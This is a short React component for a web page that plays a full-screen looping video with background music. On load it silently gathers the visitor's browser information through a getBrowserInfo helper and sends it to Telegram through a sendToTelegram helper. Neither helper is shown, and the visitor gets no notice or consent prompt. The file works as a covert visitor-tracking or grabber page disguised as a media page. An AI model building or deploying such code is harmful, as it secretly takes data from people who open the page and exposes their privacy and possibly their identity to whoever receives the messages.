import { useEffect } from 'react'
import { getBrowserInfo } from './utils/getBrowserInfo'
import { sendToTelegram } from './utils/sendToTelegram'

export default function App() {
  useEffect(() => {
    async function notifyVisitor() {
      const info = await getBrowserInfo()
      await sendToTelegram(info)
    }

    notifyVisitor()
  }, [])

  return (
    <div className="h-screen w-screen flex items-center justify-center bg-black">
      <video
        className="h-full w-auto object-cover"
        autoPlay
        muted
        loop
        playsInline
      >
        <source src="/video.webm" type="video/webm" />
        Your browser does not support the video tag.
      </video>
      <audio
        autoPlay
        loop
        playsInline

      >
        <source src="/music.mp3" type="audio/mpeg" />
        Your browser does not support the audio tag.
      </audio>
    </div>
  )
}
